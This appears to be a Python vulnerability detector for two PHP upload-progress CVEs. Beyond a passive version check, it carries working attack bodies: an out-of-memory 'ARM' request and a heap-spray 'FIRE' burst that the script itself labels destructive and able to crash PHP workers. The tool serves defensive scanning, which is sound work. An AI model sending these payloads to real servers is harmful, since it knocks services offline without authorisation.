#!/usr/bin/env python3
"""
php-up-2026 remote detector — CVE-2026-109618 / CVE-2026-109619 ("PHP2Shell")

Passive-by-default fingerprint + optional low-risk active probe.

  phase 1 (always)   GET /  -> parse Server / X-Powered-By -> PHP version
                     -> compare against the vendor fixed matrix
                     (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12).  No side effects.
  phase 2 (--trigger) send the exact 258-byte canonical upload-progress request
                     from the writeup. Harmless: one small multipart POST, the
                     same shape a browser sends during any upload.
  phase 3 (--arm)    send the big-filename ARM body. Proves the attacker can
                     reach OOM *inside request startup*. On a vulnerable host
                     this returns 500 with a pre-userland fatal; it does NOT
                     corrupt the process by itself.
  phase 4 (--fire)   the reclaim burst that can SIGSEGV a worker. DESTRUCTIVE:
                     DoS-class. Only for labs / authorised targets.

Usage:
  python3 scan/detect.py http://127.0.0.1:18211/index.php
  python3 scan/detect.py https://example.com/upload.php --arm --json out/x.json
"""
from __future__ import annotations

import argparse
import json
import re
import socket
import ssl
import struct
import sys
import time
import urllib.parse
from datetime import datetime, timezone

FIXED = {"8.1": None, "8.2": "8.2.35", "8.3": "8.3.36", "8.4": "8.4.27", "8.5": "8.5.12"}
BOUNDARY = "UctxPoc2026"
SID = "d0123456789abcdefghijklmnopqrs"


def split_url(url: str):
    u = urllib.parse.urlparse(url if "://" in url else "http://" + url)
    host = u.hostname
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    return u.scheme, host, port, path


def part(name: str, value: bytes, filename: bytes | None = None) -> bytes:
    d = b'Content-Disposition: form-data; name="' + name.encode() + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return b"--" + BOUNDARY.encode() + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n"


def body_trigger() -> bytes:
    """Exact canonical request from the leak (Content-Length 258)."""
    b = (part("PHPSESSID", SID.encode())
         + part("PHP_SESSION_UPLOAD_PROGRESS", b"x")
         + part("f", b"Z", b"a")
         + b"--" + BOUNDARY.encode() + b"--\r\n")
    return b


def body_arm(namelen: int = 1300000) -> bytes:
    b = (part("PHPSESSID", SID.encode())
         + part("PHP_SESSION_UPLOAD_PROGRESS", b"x")
         + part("f", b"A" * 6144, b"N" * namelen)
         + b"--" + BOUNDARY.encode() + b"--\r\n")
    return b


def body_fire(n_spray: int = 150, n_small: int = 600) -> bytes:
    marker = 0x4141414141414141
    spray_len = 8208 - 24 - 1
    z = struct.pack("<QII", marker, 8, 0)
    blob = (z * (spray_len // 16))[:spray_len]
    small = struct.pack("<QII", marker, 8, 0) + b"\x00" * 8
    b = (part("PHPSESSID", SID.encode())
         + part("PHP_SESSION_UPLOAD_PROGRESS", b"x"))
    b += b"".join(part("s[]", blob) for _ in range(n_spray))
    b += b"".join(part("t[]", small) for _ in range(n_small))
    b += part("f", b"A" * 6144, b"a") + part("g", b"B" * 6144, b"b")
    return b + b"--" + BOUNDARY.encode() + b"--\r\n"


def request(scheme, host, port, path, method="GET", body: bytes | None = None,
            timeout=12, headers=()):
    raw = socket.create_connection((host, port), timeout=timeout)
    if scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = ctx.wrap_socket(raw, server_hostname=host)
    extra = "".join(f"{k}: {v}\r\n" for k, v in headers)
    head = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"
            f"User-Agent: php-up-2026-detector/1.0\r\n{extra}")
    if body is not None:
        head += (f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
                 f"Content-Length: {len(body)}\r\n")
    head += "Connection: close\r\n\r\n"
    raw.sendall(head.encode() + (body or b""))
    chunks = []
    raw.settimeout(timeout)
    try:
        while True:
            d = raw.recv(65536)
            if not d:
                break
            chunks.append(d)
    except (socket.timeout, ConnectionResetError, ssl.SSLError):
        pass
    finally:
        raw.close()
    blob = b"".join(chunks)
    if not blob:
        return None, b""
    hdr, _, resp_body = blob.partition(b"\r\n\r\n")
    return hdr, resp_body


def vtuple(v: str):
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", v or "")
    return tuple(int(x) for x in m.groups()) if m else None


def classify(version: str):
    """Return (verdict, reason)."""
    t = vtuple(version)
    if not t:
        return "UNKNOWN", "no parseable PHP version in headers"
    series = f"{t[0]}.{t[1]}"
    if t[0] < 8:
        return "VULNERABLE", (f"PHP {series} is EOL upstream; GHSA matrix covers "
                              f"8.2.35/8.3.36/8.4.27/8.5.12 only - no fix will land")
    fixed = FIXED.get(series)
    if fixed is None:
        return "UNKNOWN", f"PHP {series} outside the advisory matrix"
    if t < vtuple(fixed):
        return "VULNERABLE", f"PHP {version} < {fixed} (unpatched)"
    return "PATCHED", f"PHP {version} >= {fixed}"


def hdr_get(hdr: bytes, name: str) -> str:
    for line in (hdr or b"").split(b"\r\n"):
        if line.lower().startswith(name.lower().encode() + b":"):
            return line.split(b":", 1)[1].decode("latin1").strip()
    return ""


def main() -> int:
    ap = argparse.ArgumentParser(description="CVE-2026-109618/109619 detector")
    ap.add_argument("target")
    ap.add_argument("--trigger", action="store_true", help="send the 258B canonical request")
    ap.add_argument("--arm", action="store_true", help="send the big-filename arm body")
    ap.add_argument("--arm-namelen", type=int, default=1300000)
    ap.add_argument("--fire", action="store_true", help="DESTRUCTIVE reclaim burst")
    ap.add_argument("--json", help="write machine-readable report here")
    a = ap.parse_args()

    scheme, host, port, path = split_url(a.target)
    rep = {"target": a.target, "time": datetime.now(timezone.utc).isoformat(),
           "phases": [], "php_version": None, "verdict": None, "reason": None}

    def phase(name, **kw):
        rep["phases"].append(dict(name=name, **kw))
        print(f"  {name}: " + "  ".join(f"{k}={v}" for k, v in kw.items()))

    print(f"[1] passive fingerprint  {scheme}://{host}:{port}{path}")
    try:
        hdr, body = request(scheme, host, port, path)
    except OSError as e:
        phase("fingerprint", error=f"{type(e).__name__}: {e}")
        rep["verdict"], rep["reason"] = "UNREACHABLE", str(e)
        print("\n" + "=" * 68 + f"\n VERDICT: UNREACHABLE\n {rep['reason']}\n" + "=" * 68)
        if a.json:
            json.dump(rep, open(a.json, "w"), indent=2)
        return 3
    if hdr is None:
        phase("fingerprint", error="no response")
        rep["verdict"] = "UNREACHABLE"
    else:
        status = hdr.split(b"\r\n", 1)[0].decode("latin1", "replace")
        powered = hdr_get(hdr, "X-Powered-By")
        server = hdr_get(hdr, "Server")
        turbo = hdr_get(hdr, "X-Turbo-Charged-By")
        m = re.search(r"PHP/([0-9][0-9A-Za-z._+-]*)", powered) or \
            re.search(r"PHP/([0-9][0-9A-Za-z._+-]*)", body[:4096].decode("latin1", "replace"))
        ver = m.group(1) if m else ""
        sapi = "LiteSpeed/LSAPI" if "litespeed" in (server + turbo).lower() else "?"
        rep["php_version"] = ver or None
        if ver:
            v, why = classify(ver)
            rep["verdict"], rep["reason"] = v, why
        else:
            rep["verdict"], rep["reason"] = "UNKNOWN", "X-Powered-By hidden (expose_php=Off) - version not disclosed"
        phase("fingerprint", status=status.split()[1] if len(status.split()) > 1 else "?",
              x_powered_by=powered or "-", server=server or "-", sapi_hint=sapi,
              php_version=ver or "-")

    if a.trigger:
        print("[2] canonical 258B upload-progress trigger")
        b = body_trigger()
        t0 = time.time()
        hdr, body = request(scheme, host, port, path, "POST", b)
        phase("trigger", bytes=len(b), status=(hdr.split(b"\r\n", 1)[0].split()[1].decode()
              if hdr else "NO-RESPONSE"), dt=f"{time.time()-t0:.2f}s")

    if a.arm:
        print(f"[3] ARM body (filename flood, {a.arm_namelen}B name)")
        b = body_arm(a.arm_namelen)
        t0 = time.time()
        hdr, body = request(scheme, host, port, path, "POST", b)
        st = hdr.split(b"\r\n", 1)[0].split()[1].decode() if hdr else "NO-RESPONSE"
        sig = "pre-RINIT-OOM-suspect" if st == "500" else "no-OOM"
        phase("arm", bytes=len(b), status=st, dt=f"{time.time()-t0:.2f}s", signal=sig)
        rep["arm_signal"] = sig

    if a.fire:
        print("[4] FIRE burst (destructive)")
        b = body_fire()
        try:
            hdr, body = request(scheme, host, port, path, "POST", b, timeout=20)
            st = hdr.split(b"\r\n", 1)[0].split()[1].decode() if hdr else "NO-RESPONSE"
        except Exception as e:
            st = f"EXC-{type(e).__name__}"
        phase("fire", bytes=len(b), status=st,
              note="NO-RESPONSE/reset after arm == worker killed by the reclaim")

    print()
    print("=" * 68)
    print(f" VERDICT: {rep['verdict']}" + (f"  ({rep['php_version']})" if rep["php_version"] else ""))
    print(f"          {rep['reason']}")
    print(" NOTE: version-based verdicts are 'passive/VKEV'. A distro package may")
    print("       carry a backported fix under an older version string, and a WAF")
    print("       may block multipart. Confirm with the local auditor (scan/audit.sh).")
    print("=" * 68)
    if a.json:
        with open(a.json, "w") as fh:
            json.dump(rep, fh, indent=2)
        print(f"report -> {a.json}")
    return 0 if rep["verdict"] == "PATCHED" else (2 if rep["verdict"] == "VULNERABLE" else 1)


if __name__ == "__main__":
    sys.exit(main())
